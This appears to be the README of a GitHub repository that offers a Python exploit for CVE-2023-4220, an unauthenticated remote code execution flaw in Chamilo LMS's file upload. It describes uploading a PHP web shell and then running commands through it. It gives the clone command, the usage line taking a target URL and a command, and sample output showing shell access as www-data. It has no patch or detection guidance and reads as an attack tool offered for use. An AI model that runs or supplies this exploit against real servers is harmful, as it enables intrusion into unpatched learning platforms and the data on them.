## Details
* **CVE ID:** CVE-2023-4220
* **Affected Software:** Chamilo LMS
* **Vulnerability Type:** Unauthenticated Remote Code Execution (RCE)
* **Severity:** Critical
* **Author:** Mohamed Kamel BOUZEKRIA
* **Tested On:** Chamilo 1.11.24 (Codename: Beersel, Release Date: 31/08/2023)

Chamilo LMS versions prior to this release are vulnerable to this issue. The vulnerability arises from improper validation and handling of file uploads, allowing attackers to upload and execute malicious files on the server.

## Exploit Description

This exploit targets the file upload functionality in Chamilo LMS. By crafting a malicious file containing PHP code and uploading it through an unauthenticated endpoint, an attacker can execute arbitrary commands on the server.

### Exploit Workflow:
1. **Step 1:** Upload a PHP web shell via the vulnerable file upload mechanism.
2. **Step 2:** Access the uploaded file through the web and execute arbitrary commands by passing them as parameters.

## Prerequisites
- Python 3.x installed on your system.
- Requests library: Install via pip install requests.

## Usage
### Step 1: Clone the Repository

```
git clone https://github.com/0x00-null/-Chamilo-CVE-2023-4220-RCE-Exploit.git
cd -Chamilo-CVE-2023-4220-RCE-Exploit
```

### Step 2: Run the Exploit

Run the exploit by passing the target URL and the command you wish to execute as arguments:

```
python exploit.py <target_url> <command>
```

### Example:

```
python exploit.py http://target-site/path-to-upload id
```

This command will:
1. Upload a PHP web shell to the specified target_url.
2. Execute the id command on the remote server through the uploaded shell.

### Expected Output

If successful, the script will output:
- Confirmation that the file was uploaded.
- The URL to access the web shell.
- The output of the executed command.

For example:

```
[+] File uploaded successfully!
[+] Access the shell at: http://target-site/uploads/shell.php?cmd=id
[+] Command Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
